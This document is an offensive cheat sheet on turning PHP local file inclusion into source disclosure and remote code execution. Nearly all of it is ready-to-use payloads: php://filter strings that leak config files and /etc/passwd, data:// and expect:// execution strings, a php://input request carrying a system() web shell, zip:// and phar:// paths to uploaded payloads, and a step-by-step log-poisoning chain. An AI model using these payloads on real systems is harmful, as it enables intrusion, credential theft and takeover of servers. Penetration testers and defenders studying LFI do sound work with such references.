# PHP wrappers for LFI exploitation

When the sink is PHP `include` / `require` / `file_get_contents`, wrappers turn a read primitive into source disclosure or RCE.

## `php://filter` — source disclosure (highest signal)

```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=/var/www/html/config.php
php://filter/convert.base64-encode/resource=../../../etc/passwd
```
Returns base64 of the file. Works even when the target would otherwise be executed (e.g. `.php`). Use this as the **first** probe when you suspect a PHP `include` sink — it confirms LFI and leaks source in one request.

## `php://filter` chains — file read with normalisation
```
php://filter/read=string.toupper|convert.base64-encode/resource=/etc/passwd
```

## `php://filter` chain → RCE without upload (modern exploitation)

Tooling: `synacktiv/php_filter_chain_generator`. Chains `convert.iconv` filters to materialize attacker-chosen bytes from charset-conversion side effects, then `php://filter` is consumed by `include`, executing the materialized PHP. Works on patched PHP 7.x/8.x with no file-upload primitive. Only attempt on systems you own.

## `data://` — direct payload execution
```
data://text/plain,<?php phpinfo();?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```
Requires `allow_url_include=On`. Rare in modern configs but still seen on legacy apps.

## `expect://` — direct command execution
```
expect://id
expect://whoami
```
Requires the `expect` PECL extension. Uncommon; worth one probe.

## `php://input` — body-as-source
```
GET /vuln.php?page=php://input HTTP/1.1
...
<?php system($_GET['c']); ?>
```
Requires `allow_url_include=On`. Combine with `?c=id` in the same request.

## `file://` — absolute path through a parser
```
file:///etc/passwd
file:///C:/Windows/win.ini
```
Sometimes survives filters that block raw `/etc/`.

## `zip://` and `phar://` — execute code from an uploaded archive

```
zip:///var/www/uploads/avatar.zip#payload.php
phar:///var/www/uploads/avatar.phar/payload.php
```
Requires an upload primitive (any file type — image uploads with embedded ZIP/PHAR work). `phar://` deserialization is a separate, more powerful primitive — see PHPGGC for gadget chains.

## Log poisoning chain (classic LFI → RCE on Linux/Apache)

1. Read `/var/log/apache2/access.log` via LFI to confirm path and that web process can read it.
2. Send a request whose `User-Agent` or URI contains `<?php system($_GET['c']); ?>`.
3. Re-include the log file via the LFI sink with `?c=id`. PHP parses and executes the injected tag.

Variants: `/var/log/auth.log` (inject via SSH username), mail logs, `/proc/self/environ` (inject via UA on some old setups), session files in `/var/lib/php/sessions/sess_<PHPSESSID>`.
